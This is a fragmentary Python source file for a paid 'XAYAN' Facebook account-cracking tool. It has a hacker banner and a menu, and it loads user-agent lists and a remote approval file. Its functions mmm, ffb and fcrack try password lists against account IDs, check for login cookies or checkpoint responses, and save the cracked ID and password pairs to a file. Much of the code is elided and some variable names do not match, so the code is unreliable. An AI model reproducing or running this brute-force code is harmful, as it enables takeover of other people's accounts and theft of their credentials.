...
for xd in range(5000):
	...
	ugen.append(uaku2)
try:
	prox= requests.get('https://github.com/shuvotushar/aproval/blob/main/aproval.txt').text
...
logo=("""
      ...
      \033[97;1█▄▀█▀▄█░▄▄▀██░███░█░▄▄▀██░▀██░
       ...
       \033[97;1█▀▄█▄▀█░██░████░███░██░██░██▄░
      \033[92;1▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
      \033[97;1mXAYAN ALWAYS KING 😈
\033[91;1m--------------------------------------------------
\033[97;1m>>     Owner    : XAYAN 
\033[97;1m>>     Facebook : XAYAN-
\033[97;1m>>     Version  : 1.0
\033[97;1m>>     Github    : XAYAN-404
\033[92;1m>>     Tol Type : \x1b[91;1m PAID
\033[91;1m--------------------------------------------------""")
def linex():
	print('\033[91;1m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> XAYAN  VERSION :\x1b[1;92m 1.1 ')
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-open https://www.facebook.com/groups/720995922656547/?ref=share/');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[XAYAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[XAYAN-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/XAYAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in XAYAN:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[XAYAN-OK] '+ids+' | '+pas+'\033[1;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[XAYAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mXAYAN\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
	...
	'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36'
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[XAYAN-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[XAYAN-OK] '+uid+' | '+ps+'\33[0;97m')
